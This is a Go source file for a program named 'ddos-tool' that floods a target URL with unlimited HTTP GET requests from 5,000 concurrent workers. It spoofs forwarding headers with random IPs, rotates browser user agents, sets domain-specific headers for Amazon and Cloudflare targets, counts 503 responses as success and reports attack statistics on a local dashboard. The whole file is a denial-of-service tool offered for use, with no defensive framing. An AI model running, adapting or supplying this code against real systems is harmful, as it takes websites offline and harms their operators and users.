package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// Global counters
var (
	requestsSent    uint64
	successCount    uint64
	errorCount      uint64
	last503Count    uint64
	activeWorkers   uint64
	lastRequestTime int64
)

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: ./ddos-tool <target-url>")
	}
	target := os.Args[1]

	// Validate target
	if _, err := url.ParseRequestURI(target); err != nil {
		log.Fatalf("Invalid URL: %v", err)
	}

	// Increase file descriptor limits
	runtime.GOMAXPROCS(runtime.NumCPU() * 2)

	// Start web dashboard
	go func() {
		fs := http.FileServer(http.Dir("./public"))
		http.Handle("/", fs)
		http.HandleFunc("/stats", statsHandler)
		fmt.Println("Dashboard available at http://localhost:8080")
		log.Fatal(http.ListenAndServe(":8080", nil))
	}()

	// Start attack
	startAttack(target)
}

func startAttack(target string) {
	concurrency := 5000 // Adjust based on hardware
	sem := make(chan struct{}, concurrency)

	fmt.Printf("Starting attack on %s with %d workers\n", target, concurrency)
	fmt.Println("Press Ctrl+C to stop")

	for {
		sem <- struct{}{}
		atomic.AddUint64(&activeWorkers, 1)
		
		go func() {
			defer func() {
				<-sem
				atomic.AddUint64(&activeWorkers, ^uint64(0))
			}()
			
			makeRequest(target)
			atomic.AddUint64(&requestsSent, 1)
			atomic.StoreInt64(&lastRequestTime, time.Now().UnixNano())
		}()
	}
}

func makeRequest(target string) {
	ip := generateIP()
	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 0,
		LocalAddr: &net.TCPAddr{IP: net.ParseIP(ip)},
	}

	transport := &http.Transport{
		DialContext:       dialer.DialContext,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:      0,
		IdleConnTimeout:   0,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	req, _ := http.NewRequest("GET", target, nil)
	req.Header = generateHeaders(target, ip)

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddUint64(&errorCount, 1)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 503 {
		atomic.AddUint64(&last503Count, 1)
		atomic.AddUint64(&successCount, 1)
	} else if resp.StatusCode >= 400 {
		atomic.AddUint64(&errorCount, 1)
	} else {
		atomic.AddUint64(&successCount, 1)
	}
}

func generateIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(253)+1,
		rand.Intn(256),
		rand.Intn(256),
		rand.Intn(253)+1,
	)
}

func generateHeaders(target, ip string) http.Header {
	u, _ := url.Parse(target)
	h := http.Header{}

	// Standard headers
	h.Set("User-Agent", getRandomUA())
	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	h.Set("Accept-Language", "en-US,en;q=0.5")
	h.Set("Connection", "close")
	h.Set("X-Forwarded-For", ip)
	h.Set("X-Real-IP", ip)
	h.Set("CF-Connecting_IP", ip)

	// Custom headers based on domain
	switch {
	case strings.Contains(u.Host, "amazon"):
		h.Set("Referer", "https://www.amazon.com/")
		h.Set("Cookie", "session-id="+randomString(20))
	case strings.Contains(u.Host, "cloudflare"):
		h.Set("Referer", "https://www.cloudflare.com/")
		h.Set("CF-IPCountry", randomCountryCode())
	default:
		h.Set("Referer", "https://"+u.Host+randomPath())
	}

	// Browser-like headers
	if rand.Intn(10) > 7 {
		h.Set("Upgrade-Insecure-Requests", "1")
	}
	if rand.Intn(10) > 8 {
		h.Set("DNT", "1")
	}

	return h
}

func getRandomUA() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 14; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
	}
	return agents[rand.Intn(len(agents))]
}

func randomString(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func randomPath() string {
	paths := []string{"/", "/search", "/products", "/contact", "/about", "/login"}
	return paths[rand.Intn(len(paths))] + "?q=" + randomString(6)
}

func randomCountryCode() string {
	codes := []string{"US", "GB", "DE", "FR", "CA", "JP", "BR", "IN", "RU", "CN"}
	return codes[rand.Intn(len(codes))]
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{
		"requests_sent": %d,
		"success_count": %d,
		"error_count": %d,
		"503_count": %d,
		"active_workers": %d,
		"last_request": %d,
		"rps": %.1f
	}`,
		atomic.LoadUint64(&requestsSent),
		atomic.LoadUint64(&successCount),
		atomic.LoadUint64(&errorCount),
		atomic.LoadUint64(&last503Count),
		atomic.LoadUint64(&activeWorkers),
		atomic.LoadInt64(&lastRequestTime),
		calculateRPS(),
	)
}

func calculateRPS() float64 {
	if requestsSent < 100 {
		return 0
	}
	last := time.Unix(0, atomic.LoadInt64(&lastRequestTime))
	elapsed := time.Since(last).Seconds()
	if elapsed < 1 {
		return float64(requestsSent) / 5 // Initial estimate
	}
	return float64(requestsSent) / elapsed
}
